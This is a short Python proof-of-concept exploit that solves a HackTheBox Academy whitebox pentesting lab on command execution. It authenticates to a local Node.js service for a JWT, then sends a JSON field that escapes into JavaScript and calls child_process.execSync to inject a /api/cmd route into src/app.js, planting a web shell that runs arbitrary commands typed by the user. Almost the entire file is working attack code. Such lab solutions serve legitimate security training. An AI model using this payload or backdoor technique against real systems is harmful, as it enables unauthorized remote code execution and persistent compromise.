#! /usr/bin/env python3
# POC to solve the lab called 'INTRO TO WHITEBOX PENTESTING: Command Execution' on HackTheBox Academy 

import requests 
import time

url = "http://localhost:5000"

proxies = {"http":"http://127.0.0.1:8080"}

headers= {
        "Content-type": "application/json"
}

json = {"email":"test@hackthebox.com"}

session = requests.Session()

# Step 1: Get jwt token
response = session.post(f"{url}/api/auth/authenticate", json=json, proxies=proxies)

token = response.json().get('token')

headers2= {
        "Content-type": "application/json",
        "Authorization":f"Bearer {token}"
}

# Step 2: perform command injection payload
json2= {"text":"'})+require('child_process').execSync('sed -i \"17i app.get(\\\\\"/api/cmd\\\\\", (req, res) => {  const cmd = require(\\\\\"child_process\\\\\").execSync(req.query.cmd).toString();  res.send(cmd);});\" src/app.js');//"}

response1 = session.post(url=f"{url}/api/service/generate", proxies=proxies, json=json2, headers=headers2)

time.sleep(1)

# Step 3: Run command 
command = input("Enter command to run: ")

response2 = session.get(url=f"{url}/api/cmd?cmd={command}")

print(response2.text)



